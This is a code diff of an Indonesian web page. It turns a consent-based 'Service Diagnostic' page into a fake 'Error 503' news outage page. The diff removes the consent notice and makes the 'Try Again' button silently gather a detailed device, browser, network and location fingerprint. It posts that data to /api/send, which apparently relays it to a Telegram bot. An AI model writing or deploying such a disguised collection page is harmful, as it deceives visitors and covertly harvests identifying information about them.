@@ -2,8 +2,7 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Service Diagnostic</title>
+<title>Error 503</title>
 
 <style>
 *{box-sizing:border-box}
@@ -22,31 +21,57 @@ body{
   border-radius:6px;
   padding:30px 20px 35px;
   text-align:center;
-  box-shadow:0 5px 20px rgba(0,0,0,.08);
 }
 
 .icon{
   font-size:48px;
-  margin-bottom:10px;
+  color:#f4b400;
+  margin-bottom:10px
 }
 
 .title{
-  font-size:32px;
+  font-size:36px;
   font-weight:700;
   color:#d32f2f;
-  margin:5px 0;
+  margin:5px 0
 }
 
 .subtitle{
   font-size:18px;
   font-weight:600;
-  margin-bottom:10px;
+  margin-bottom:10px
 }
 
 .desc{
   font-size:14px;
   color:#666;
-  margin-bottom:15px;
+  margin-bottom:15px
+}
+
+#line{
+  height:3px;
+  background:#d32f2f;
+  width:100%;
+  margin:15px 0 20px
+}
+
+.detail{
+  text-align:left;
+  font-size:14px;
+  color:#444
+}
+
+.detail p{
+  margin:6px 0
+}
+
+.detail ul{
+  margin:8px 0 0 18px;
+  padding:0
+}
+
+.detail li{
+  margin:6px 0
 }
 
 .detail-box{
@@ -54,17 +79,7 @@ body{
   border-left:4px solid #d32f2f;
   padding:12px 14px;
   margin-top:10px;
-  border-radius:4px;
-  text-align:left;
-}
-
-.detail{
-  font-size:14px;
-  color:#444;
-}
-
-.detail p{
-  margin:6px 0;
+  border-radius:4px
 }
 
 button{
@@ -76,11 +91,11 @@ button{
   padding:10px 26px;
   font-size:14px;
   border-radius:4px;
-  cursor:pointer;
+  cursor:pointer
 }
 
 button:hover{
-  background:#b71c1c;
+  background:#b71c1c
 }
 
 .loading-bar{
@@ -89,21 +104,19 @@ button:hover{
   background:#f1caca;
   overflow:hidden;
   margin:15px 0;
-  border-radius:2px;
-  display:none;
+  border-radius:2px
 }
 
 .loading-fill{
   width:0%;
   height:100%;
   background:#d32f2f;
-  transition:width 1.8s linear;
+  transition:width 1.8s linear
 }
 
 .footer{
-  font-size:12px;
-  color:#777;
-  line-height:1.5;
+  font-size:13px;
+  color:#666
 }
 </style>
 </head>
@@ -121,45 +134,64 @@ button:hover{
   </div>
 
   <div class="desc">
-    Sistem sedang mengalami gangguan teknis sementara.
+    Maaf, layanan berita sedang mengalami gangguan teknis sementara.
   </div>
 
   <div class="loading-bar" id="loadingBar">
-    <div class="loading-fill" id="loadingFill"></div>
+    <div class="loading-fill"></div>
   </div>
 
   <div class="detail-box">
+
     <div class="detail">
+
       <p>
-        <strong>Diagnostik:</strong>
-        Anda dapat mengirim laporan teknis untuk membantu administrator memperbaiki masalah.
+        <strong>Detail kesalahan:</strong>
+        Koneksi timeout ke server berita
       </p>
 
       <p>
-        Laporan hanya berisi informasi teknis browser/perangkat yang diperlukan untuk debugging.
+        <strong>Solusi yang mungkin:</strong>
       </p>
+
+      <ul>
+        <li>Periksa koneksi internet Anda</li>
+        <li>Coba muat ulang halaman ini nanti</li>
+        <li>Bersihkan cache browser Anda</li>
+      </ul>
+
     </div>
+
   </div>
 
   <button onclick="sendReport()">
-    Kirim Laporan Diagnostik
+    Coba Lagi
   </button>
 
   <div class="footer">
-    Informasi diagnostik dikirim dengan persetujuan Anda.
+    Jika masalah berlanjut, silakan hubungi administrator sistem.
   </div>
 
 </div>
 
 <script>
 
-function createReportId(){
-  return crypto.randomUUID
-    ? crypto.randomUUID()
-    : Date.now().toString(36) + Math.random().toString(36).slice(2);
-}
+async function sendReport() {
 
-function collectDiagnostics(){
+  const bar = document.getElementById("loadingBar");
+  const fill = bar.querySelector(".loading-fill");
+
+  bar.style.display = "block";
+  fill.style.width = "0%";
+
+  setTimeout(() => {
+    fill.style.width = "100%";
+  }, 50);
+
+
+  /* ===============================
+     INFORMASI PERANGKAT
+  =============================== */
 
   const connection =
     navigator.connection ||
@@ -167,10 +199,20 @@ function collectDiagnostics(){
     navigator.webkitConnection ||
     null;
 
-  return {
 
-    /* DEVICE */
+  const screenOrientation =
+    screen.orientation?.type || "Unknown";
 
+
+  const languages =
+    navigator.languages
+      ? navigator.languages.join(", ")
+      : navigator.language || "Unknown";
+
+
+  const data = {
+
+    /* Device */
     os:
       navigator.userAgentData?.platform ||
       navigator.platform ||
@@ -189,49 +231,53 @@ function collectDiagnostics(){
         ? navigator.deviceMemory + " GB (approx)"
         : "Unknown",
 
-    /* DISPLAY */
 
+    /* Display */
     resolution:
-      `${screen.width}x${screen.height}`,
+      screen.width + "x" + screen.height,
 
     viewport:
-      `${window.innerWidth}x${window.innerHeight}`,
+      window.innerWidth + "x" + window.innerHeight,
 
     pixelRatio:
       window.devicePixelRatio || "Unknown",
 
     orientation:
-      screen.orientation?.type || "Unknown",
+      screenOrientation,
 
-    touchPoints:
-      navigator.maxTouchPoints || 0,
 
-    /* BROWSER */
-
+    /* Browser */
     browser:
       navigator.userAgent || "Unknown",
 
     vendor:
       navigator.vendor || "Unknown",
 
-    cookiesEnabled:
-      navigator.cookieEnabled,
+
+    /* Browser state */
+    cookies:
+      navigator.cookieEnabled
+        ? "Enabled"
+        : "Disabled",
+
+    online:
+      navigator.onLine
+        ? "Online"
+        : "Offline",
 
     doNotTrack:
       navigator.doNotTrack || "Unknown",
 
-    online:
-      navigator.onLine,
+    touchPoints:
+      navigator.maxTouchPoints || 0,
 
-    /* LANGUAGE */
 
+    /* Language */
     language:
       navigator.language || "Unknown",
 
     languages:
-      navigator.languages?.join(", ") ||
-      navigator.language ||
-      "Unknown",
+      languages,
 
     timezone:
       Intl.DateTimeFormat()
@@ -241,8 +287,8 @@ function collectDiagnostics(){
     timezoneOffset:
       new Date().getTimezoneOffset(),
 
-    /* CONNECTION */
 
+    /* Connection */
     connectionType:
       connection?.type || "Unknown",
 
@@ -259,80 +305,93 @@ function collectDiagnostics(){
         ? connection.rtt + " ms"
         : "Unknown",
 
-    /* PAGE */
 
-    referrer:
-      document.referrer || "Direct",
-
+    /* Page */
     page:
       location.href,
 
+    referrer:
+      document.referrer || "Direct / None",
+
+
+    /* Time */
     clientTime:
+      new Date().toString(),
+
+    clientISO:
       new Date().toISOString(),
 
+
+    /* ID laporan */
     reportId:
-      createReportId()
+      "REP-" +
+      Date.now() +
+      "-" +
+      Math.random()
+        .toString(36)
+        .substring(2, 8)
+        .toUpperCase()
+
   };
-}
 
-async function sendReport(){
-
-  const bar =
-    document.getElementById("loadingBar");
-
-  const fill =
-    document.getElementById("loadingFill");
-
-  bar.style.display = "block";
-  fill.style.width = "0%";
-
-  setTimeout(() => {
-    fill.style.width = "100%";
-  }, 50);
-
-  const data = collectDiagnostics();
 
   try {
 
     const response = await fetch("/api/send", {
+
       method: "POST",
+
       headers: {
         "Content-Type": "application/json"
       },
+
       body: JSON.stringify(data)
+
     });
 
+
+    const result =
+      await response.json().catch(() => ({}));
+
+
+    console.log("Server response:", result);
+
+
     if (!response.ok) {
-      throw new Error("HTTP " + response.status);
-    }
 
-    setTimeout(() => {
-
-      alert(
-        "Laporan diagnostik berhasil dikirim."
+      throw new Error(
+        result.error ||
+        result.telegram_response ||
+        `HTTP ${response.status}`
       );
 
-    }, 800);
+    }
+
+
+    alert("Laporan diagnostik berhasil dikirim.");
 
   } catch (error) {
 
-    console.error(error);
+    console.error("SEND ERROR:", error);
 
     alert(
-      "Gagal mengirim laporan diagnostik."
+      "Gagal mengirim laporan diagnostik.\n\n" +
+      error.message
     );
 
   } finally {
 
     setTimeout(() => {
-      fill.style.width = "0%";
-      bar.style.display = "none";
+
+      location.reload();
+
     }, 2000);
 
   }
+
 }
 
 </script>
 
 </body>
-</html>
+    </html>
